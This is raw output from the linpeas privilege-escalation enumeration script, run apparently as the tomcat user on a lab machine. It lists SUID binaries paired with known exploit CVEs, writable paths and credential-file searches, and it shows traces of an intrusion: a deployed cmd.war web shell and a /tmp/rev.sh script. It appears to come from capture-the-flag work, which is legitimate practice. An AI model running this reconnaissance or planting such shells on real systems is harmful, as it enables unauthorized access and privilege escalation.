SecEvent.Evt Not Found
                                                                                                                    
appcmd.exe Not Found
                                                                                                                    
bash.exe Not Found
                                                                                                                    
datasources.xml Not Found
                                                                                                                    
default.sav Not Found
                                                                                                                    
drives.xml Not Found
                                                                                                                    
groups.xml Not Found
                                                                                                                    
https-xampp.conf Not Found
                                                                                                                    
https.conf Not Found
                                                                                                                    
iis6.log Not Found
                                                                                                                    
index.dat Not Found
                                                                                                                    
my.cnf Not Found
                                                                                                                    
my.ini Not Found
                                                                                                                    
ntuser.dat Not Found
                                                                                                                    
pagefile.sys Not Found
                                                                                                                    
-rw-r--r-- 1 root root 72941 May  5  2020 /etc/php/7.4/apache2/php.ini
-rw-r--r-- 1 root root 72539 May  5  2020 /etc/php/7.4/cli/php.ini

printers.xml Not Found
                                                                                                                    
recentservers.xml Not Found
                                                                                                                    
scclient.exe Not Found
                                                                                                                    
scheduledtasks.xml Not Found
                                                                                                                    
security.sav Not Found
                                                                                                                    
-rw-r----- 1 root tomcat 7630 May 21  2020 /etc/tomcat9/server.xml
-rw-r--r-- 1 root root 7586 Feb 24  2020 /usr/share/tomcat9/etc/server.xml

setupinfo Not Found
                                                                                                                    
setupinfo.bak Not Found
                                                                                                                    
sitemanager.xml Not Found
                                                                                                                    
sites.ini Not Found
                                                                                                                    
software Not Found
                                                                                                                    
software.sav Not Found
                                                                                                                    
sysprep.inf Not Found
                                                                                                                    
sysprep.xml Not Found
                                                                                                                    
system.sav Not Found
                                                                                                                    
unattend.txt Not Found
                                                                                                                    
unattend.xml Not Found
                                                                                                                    
unattended.xml Not Found
                                                                                                                    
wcx_ftp.ini Not Found
                                                                                                                    
ws_ftp.ini Not Found
                                                                                                                    
web*.config Not Found
                                                                                                                    
winscp.ini Not Found
                                                                                                                    
wsl.exe Not Found
                                                                                                                    
╔══════════╣ Analyzing Other Interesting Files Files (limit 70)
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc                                                          
-rw-r--r-- 1 tomcat tomcat 3771 Feb 25  2020 /opt/tomcat/.bashrc
-rw-r--r-- 1 root root 3771 Apr  4  2018 /snap/core18/1705/etc/skel/.bashrc

.google_authenticator Not Found
                                                                                                                    
hosts.equiv Not Found
                                                                                                                    
.lesshst Not Found
                                                                                                                    
.plan Not Found
                                                                                                                    
-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 tomcat tomcat 807 Feb 25  2020 /opt/tomcat/.profile
-rw-r--r-- 1 root root 807 Apr  4  2018 /snap/core18/1705/etc/skel/.profile

.recently-used.xbel Not Found
                                                                                                                    
.rhosts Not Found
                                                                                                                    
.sudo_as_admin_successful Not Found
                                                                                                                    

════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                    
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                         
strings Not Found                                                                                                   
-rwsr-xr-x 1 root root 109K Apr 10  2020 /snap/snapd/7264/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                      
-rwsr-xr-x 1 root root 43K Jan  8  2020 /snap/core18/1705/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                
-rwsr-xr-x 1 root root 63K Jun 28  2019 /snap/core18/1705/bin/ping
-rwsr-xr-x 1 root root 44K Mar 22  2019 /snap/core18/1705/bin/su
-rwsr-xr-x 1 root root 27K Jan  8  2020 /snap/core18/1705/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /snap/core18/1705/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 22  2019 /snap/core18/1705/usr/bin/chsh (Unknown SUID binary)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /snap/core18/1705/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 22  2019 /snap/core18/1705/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 22  2019 /snap/core18/1705/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                 
-rwsr-xr-x 1 root root 146K Jan 31  2020 /snap/core18/1705/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                                                  
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper (Unknown SUID binary)                                                                                                   
-rwsr-xr-x 1 root root 427K Mar  4  2019 /snap/core18/1705/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 31K Aug 16  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)                                                                                                                
-rwsr-xr-x 1 root root 55K Apr  2  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                             
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 67K Apr 16  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                  
-rwsr-xr-x 1 root root 52K Apr 16  2020 /usr/bin/chsh (Unknown SUID binary)
-rwsr-xr-x 1 root root 67K Apr  2  2020 /usr/bin/su
-rwsr-xr-x 1 root root 84K Apr 16  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Apr 16  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 39K Apr  2  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 87K Apr 16  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount (Unknown SUID binary)
-rwsr-xr-x 1 root root 163K Feb  3  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device (Unknown SUID binary)
-rwsr-xr-x 1 root root 23K Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 128K Apr 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                                      
-rwsr-xr-x 1 root root 463K Feb 26  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51K Dec  7  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper (Unknown SUID binary)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                         
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /snap/core18/1705/sbin/pam_extrausers_chkpwd                              
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /snap/core18/1705/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /snap/core18/1705/usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /snap/core18/1705/usr/bin/expiry
-rwxr-sr-x 1 root crontab 355K Mar  4  2019 /snap/core18/1705/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 31K Jan  8  2020 /snap/core18/1705/usr/bin/wall
-rwxr-sr-x 1 root shadow 83K Apr 16  2020 /usr/bin/chage
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at (Unknown SGID binary)
-rwxr-sr-x 1 root ssh 343K Feb 26  2020 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K Apr  2  2020 /usr/bin/wall
-rwxr-sr-x 1 root shadow 31K Apr 16  2020 /usr/bin/expiry
-rwxr-sr-x 1 root mlocate 47K Jul 16  2019 /usr/bin/mlocate
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 43K Dec 17  2019 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 43K Dec 17  2019 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so                                                 
/etc/ld.so.conf                                                                                                     
include /etc/ld.so.conf.d/*.conf

"/etc/ld.so.conf.d
  "/etc/ld.so.conf.d/*
cat: '"/etc/ld.so.conf.d/*': No such file or directory

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                          
Current capabilities:                                                                                               
Current: = cap_net_bind_service+eip
CapInh: 0000000000000400
CapPrm: 0000000000000400
CapEff: 0000000000000400
CapBnd: 0000003fffffffff
CapAmb: 0000000000000400

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000400
CapPrm: 0000000000000400
CapEff: 0000000000000400
CapBnd: 0000003fffffffff
CapAmb: 0000000000000400

Files with capabilities (limited to 50):
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                          
                                                                                                                    
╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls                                                  
files with acls in searched folders Not Found                                                                       
                                                                                                                    
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                               
/usr/bin/rescan-scsi-bus.sh                                                                                         
/usr/bin/gettext.sh

╔══════════╣ Unexpected in root
/swap.img                                                                                                           

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files                                        
total 44                                                                                                            
drwxr-xr-x   2 root root 4096 Apr 23  2020 .
drwxr-xr-x 101 root root 4096 Jun 17  2020 ..
-rw-r--r--   1 root root   96 Dec  5  2019 01-locale-fix.sh
-rw-r--r--   1 root root  825 Apr 10  2020 apps-bin-path.sh
-rw-r--r--   1 root root  729 Feb  2  2020 bash_completion.sh
-rw-r--r--   1 root root 1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--   1 root root 1107 Nov  3  2019 gawk.csh
-rw-r--r--   1 root root  757 Nov  3  2019 gawk.sh
-rw-r--r--   1 root root 1557 Feb 17  2020 Z97-byobu.sh
-rwxr-xr-x   1 root root  873 Apr 16  2020 Z99-cloudinit-warnings.sh
-rwxr-xr-x   1 root root 3417 Apr 16  2020 Z99-cloud-locale-test.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                          
                                                                                                                    
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                        
═╣ Credentials in fstab/mtab? ........... No                                                                        
═╣ Can I read shadow files? ............. No                                                                        
═╣ Can I read shadow plists? ............ No                                                                        
═╣ Can I write shadow plists? ........... No                                                                        
═╣ Can I read opasswd file? ............. No                                                                        
═╣ Can I write in network-scripts? ...... No                                                                        
═╣ Can I read root folder? .............. No                                                                        
                                                                                                                    
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                              
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/var/lib/tomcat9/webapps                                                                                            

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root tomcat 5435 Feb 24  2020 /etc/tomcat9/policy.d/04webapps.policy                                   
-rw-r----- 1 root tomcat 2192 Feb 24  2020 /etc/tomcat9/policy.d/01system.policy
-rw-r----- 1 root tomcat 2040 Feb 24  2020 /etc/tomcat9/policy.d/50local.policy
-rw-r----- 1 root tomcat 3237 Feb 24  2020 /etc/tomcat9/policy.d/03catalina.policy
-rw-r----- 1 root tomcat 330 Feb 24  2020 /etc/tomcat9/policy.d/02debian.policy
-rw-r----- 1 root tomcat 7630 May 21  2020 /etc/tomcat9/server.xml
-rw-r----- 1 root tomcat 7262 Feb  5  2020 /etc/tomcat9/catalina.properties
-rw-r----- 1 root tomcat 2799 Feb 24  2020 /etc/tomcat9/logging.properties
-rw-r----- 1 root tomcat 2325 Jun 16  2020 /etc/tomcat9/tomcat-users.xml
-rw-r----- 1 root tomcat 1400 Feb  5  2020 /etc/tomcat9/context.xml
-rw-r----- 1 root tomcat 1149 Feb  5  2020 /etc/tomcat9/jaspic-providers.xml
-rw-r----- 1 root tomcat 172362 Feb  5  2020 /etc/tomcat9/web.xml

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/kern.log                                                                                                   
/var/log/auth.log
/var/log/journal/c72a21e67341466eacf74373cf80aca6/system.journal
/var/log/syslog
/tmp/hsperfdata_tomcat/950

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                
logrotate 3.14.0                                                                                                    

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes
Writable: /var/log/tomcat9/catalina.2021-08-14.log
Writable: /var/log/tomcat9/localhost.2021-08-14.log                                                                 
Writable: /var/log/tomcat9/localhost.2021-08-13.log                                                                 
                                                                                                                    
╔══════════╣ Files inside /opt/tomcat (limit 20)
total 28                                                                                                            
drwxr-xr-x 3 tomcat tomcat 4096 Jun 17  2020 .
drwxr-xr-x 3 root   root   4096 May 19  2020 ..
-rw-r--r-- 1 tomcat tomcat  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 tomcat tomcat 3771 Feb 25  2020 .bashrc
drwxrwxr-x 3 tomcat tomcat 4096 Jun 17  2020 .local
-rw-r--r-- 1 tomcat tomcat  807 Feb 25  2020 .profile
-rw-rw-r-- 1 tomcat tomcat   66 Jun 17  2020 .selected_editor

╔══════════╣ Files inside others home (limit 20)
                                                                                                                    
╔══════════╣ Searching installed mail applications
                                                                                                                    
╔══════════╣ Mails (limit 50)
                                                                                                                    
╔══════════╣ Backup folders
                                                                                                                    
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 ash ash 8716 Jun 16  2020 /var/www/html/files/16162020_backup.zip                                      
-rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 11070 May 19  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 2756 Feb 13  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 392817 Feb  9  2020 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-31/tools/testing/selftests/net/tcp_fastopen_backup_key.sh                                                                                                         
-rw-r--r-- 1 root root 0 May  7  2020 /usr/src/linux-headers-5.4.0-31-generic/include/config/net/team/mode/activebackup.h                                                                                                               
-rw-r--r-- 1 root root 0 May  7  2020 /usr/src/linux-headers-5.4.0-31-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 237729 May  7  2020 /usr/src/linux-headers-5.4.0-31-generic/.config.old
-rw-r--r-- 1 root root 8161 May  7  2020 /usr/lib/modules/5.4.0-31-generic/kernel/drivers/net/team/team_mode_activebackup.ko                                                                                                            
-rw-r--r-- 1 root root 8729 May  7  2020 /usr/lib/modules/5.4.0-31-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 43888 Mar  9  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 35320 Apr 27  2020 /usr/lib/mysql/plugin/component_mysqlbackup.so

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found: "/var/lib/command-not-found/commands.db": cannot open `"/var/lib/command-not-found/commands.db"' (No such file or directory)
Found: "/var/lib/fwupd/pending.db": cannot open `"/var/lib/fwupd/pending.db"' (No such file or directory)
Found: "/var/lib/mlocate/mlocate.db": cannot open `"/var/lib/mlocate/mlocate.db"' (No such file or directory)
Found: "/var/lib/PackageKit/transactions.db": cannot open `"/var/lib/PackageKit/transactions.db"' (No such file or directory)
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
                                                                                                                    
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
                                                                                                                    
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
                                                                                                                    

╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                          
total 12K
drwxr-xr-x  3 root root 4.0K May 21  2020 .
drwxr-xr-x 14 root root 4.0K May 21  2020 ..
drwxr-xr-x  4 root root 4.0K Jun 17  2020 html

/var/www/html:
total 48K
drwxr-xr-x 4 root root 4.0K Jun 17  2020 .
drwxr-xr-x 3 root root 4.0K May 21  2020 ..

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw------- 1 root root 0 Mar 11  2020 /snap/core18/1705/etc/.pwd.lock                                               
-rw-r--r-- 1 root root 220 Apr  4  2018 /snap/core18/1705/etc/skel/.bash_logout
-rw-r--r-- 1 landscape landscape 0 Apr 23  2020 /var/lib/landscape/.cleanup.user
-rw------- 1 root root 0 Apr 23  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 0 May 19  2020 /etc/.java/.systemPrefs/.system.lock
-rw-r--r-- 1 root root 0 May 19  2020 /etc/.java/.systemPrefs/.systemRootModFile
-rw-r--r-- 1 root root 2044 Apr 16  2020 /usr/lib/jvm/.java-1.11.0-openjdk-amd64.jinfo
-rw------- 1 root root 0 Aug 13 23:14 /run/snapd/lock/.lock
-rw-r--r-- 1 root root 37 Aug 13 23:14 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Aug 13 23:14 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 root root 0 Aug 13 23:14 /run/network/.ifstate.lock
-rw-rw-r-- 1 tomcat tomcat 66 Jun 17  2020 /opt/tomcat/.selected_editor
-rw-r--r-- 1 tomcat tomcat 220 Feb 25  2020 /opt/tomcat/.bash_logout

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                   
-rw------- 1 tomcat tomcat 32768 Aug 14 04:04 /tmp/hsperfdata_tomcat/950                                            
-rw-r----- 1 tomcat tomcat 51 Aug 14 03:31 /tmp/rev.sh
-rw-r--r-- 1 root root 3683 May 19  2020 /var/backups/apt.extended_states.3.gz
-rw-r--r-- 1 root root 41559 Jun 17  2020 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 4400 May 21  2020 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 4561 May 21  2020 /var/backups/apt.extended_states.1.gz

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                        
/dev/mqueue                                                                                                         
/dev/shm
/dev/shm/linpeas.sh
/opt/tomcat
/run/lock
/run/screen
/snap/core18/1705/run/lock
/snap/core18/1705/tmp
/snap/core18/1705/var/tmp
/tmp
/tmp/hsperfdata_tomcat
/tmp/hsperfdata_tomcat/950
/tmp/rev.sh
/tmp/tmux-997
/var/cache/tomcat9
/var/cache/tomcat9/Catalina
/var/cache/tomcat9/Catalina/localhost
/var/cache/tomcat9/Catalina/localhost/cmd
/var/cache/tomcat9/Catalina/localhost/cmd/org
/var/cache/tomcat9/Catalina/localhost/cmd/org/apache
/var/cache/tomcat9/Catalina/localhost/cmd/org/apache/jsp
/var/cache/tomcat9/Catalina/localhost/cmd/org/apache/jsp/cmdjsp_jsp.class
/var/cache/tomcat9/Catalina/localhost/cmd/org/apache/jsp/cmdjsp_jsp.java
/var/cache/tomcat9/Catalina/localhost/docs
/var/cache/tomcat9/Catalina/localhost/examples
/var/cache/tomcat9/Catalina/localhost/host-manager
/var/cache/tomcat9/Catalina/localhost/host-manager/org
/var/cache/tomcat9/Catalina/localhost/host-manager/org/apache
/var/cache/tomcat9/Catalina/localhost/host-manager/org/apache/jsp
/var/cache/tomcat9/Catalina/localhost/host-manager/org/apache/jsp/WEB_002dINF
/var/cache/tomcat9/Catalina/localhost/host-manager/org/apache/jsp/WEB_002dINF/jsp
/var/cache/tomcat9/Catalina/localhost/host-manager/org/apache/jsp/WEB_002dINF/jsp/_401_jsp.class
/var/cache/tomcat9/Catalina/localhost/host-manager/org/apache/jsp/WEB_002dINF/jsp/_401_jsp.java
/var/cache/tomcat9/Catalina/localhost/manager
/var/cache/tomcat9/Catalina/localhost/manager/org
/var/cache/tomcat9/Catalina/localhost/manager/org/apache
/var/cache/tomcat9/Catalina/localhost/manager/org/apache/jsp
/var/cache/tomcat9/Catalina/localhost/manager/org/apache/jsp/WEB_002dINF
/var/cache/tomcat9/Catalina/localhost/manager/org/apache/jsp/WEB_002dINF/jsp
/var/cache/tomcat9/Catalina/localhost/manager/org/apache/jsp/WEB_002dINF/jsp/_401_jsp.class
/var/cache/tomcat9/Catalina/localhost/manager/org/apache/jsp/WEB_002dINF/jsp/_401_jsp.java
/var/cache/tomcat9/Catalina/localhost/manager/org/apache/jsp/WEB_002dINF/jsp/_403_jsp.class
/var/cache/tomcat9/Catalina/localhost/manager/org/apache/jsp/WEB_002dINF/jsp/_403_jsp.java
/var/cache/tomcat9/Catalina/localhost/ROOT
/var/crash
/var/lib/php/sessions
/var/lib/tomcat9/lib
/var/lib/tomcat9/webapps
/var/lib/tomcat9/webapps/cmd
/var/lib/tomcat9/webapps/cmd/cmdjsp.jsp
/var/lib/tomcat9/webapps/cmd/META-INF
/var/lib/tomcat9/webapps/cmd/META-INF/war-tracker
/var/lib/tomcat9/webapps/cmd.war
/var/log/tomcat9
/var/log/tomcat9/catalina.2021-08-13.log
/var/log/tomcat9/catalina.2021-08-14.log
/var/log/tomcat9/localhost.2021-08-13.log
/var/log/tomcat9/localhost.2021-08-14.log
/var/log/tomcat9/localhost_access_log.2020-05-19.txt
#)You_can_write_even_more_files_inside_last_directory

/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                        
  Group tomcat:                                                                                                     
/var/lib/tomcat9/webapps                                                                                            
/etc/tomcat9/Catalina

╔══════════╣ Searching passwords in config PHP files
                                                                                                                    
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                    
╔══════════╣ Finding IPs inside logs (limit 70)
    891 10.10.14.3                                                                                                  
    212 10.10.14.2
     27 10.10.10.2
     25 10.10.14.4
     22 0.20.04.1
     14 10.10.10.80
     13 10.10.10.194
      9 1.3.4.202
      5 0.5.10.2
      5 020.02.11.2
      3 10.10.14.5
      2 0.99.7.1
      1 91.189.94.4
      1 127.255.255.255

╔══════════╣ Finding passwords inside logs (limit 70)
2020-05-19 10:41:53,469 - ssh_util.py[DEBUG]: line 124: option PasswordAuthentication added with yes                
2020-05-19 10:41:53,501 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
2020-05-19 10:41:53,501 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2020-05-19 11:57:35,345 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-19 11:57:35,346 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-19 23:14:41,352 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-19 23:14:41,352 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-19 23:18:10,661 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-19 23:18:10,661 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-19 23:21:09,497 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-19 23:21:09,497 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-21 00:43:15,621 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-21 00:43:15,621 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-21 00:48:34,018 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-21 00:48:34,018 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-21 10:29:52,108 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-21 10:29:52,108 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-21 13:14:55,250 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-21 13:14:55,250 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-21 20:27:34,299 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-21 20:27:34,299 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-21 21:04:21,295 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-21 21:04:21,295 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-21 21:06:39,370 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-21 21:06:39,370 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-22 00:27:59,654 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-22 00:27:59,654 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-05-22 00:45:08,585 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-05-22 00:45:08,585 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-16 09:03:11,158 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-16 09:03:11,158 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-16 12:16:01,514 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-16 12:16:01,514 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-16 14:05:21,705 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-16 14:05:21,705 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-16 14:15:38,969 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-16 14:15:38,969 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-16 16:38:39,778 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-16 16:38:39,778 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-16 17:53:24,763 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-16 17:53:24,763 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-16 20:12:10,683 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-16 20:12:10,683 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-16 21:06:22,769 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-16 21:06:22,769 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-17 08:24:59,134 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-17 08:24:59,135 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-17 08:26:30,745 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-17 08:26:30,745 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-17 15:44:46,658 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-17 15:44:46,658 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-17 16:22:29,697 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
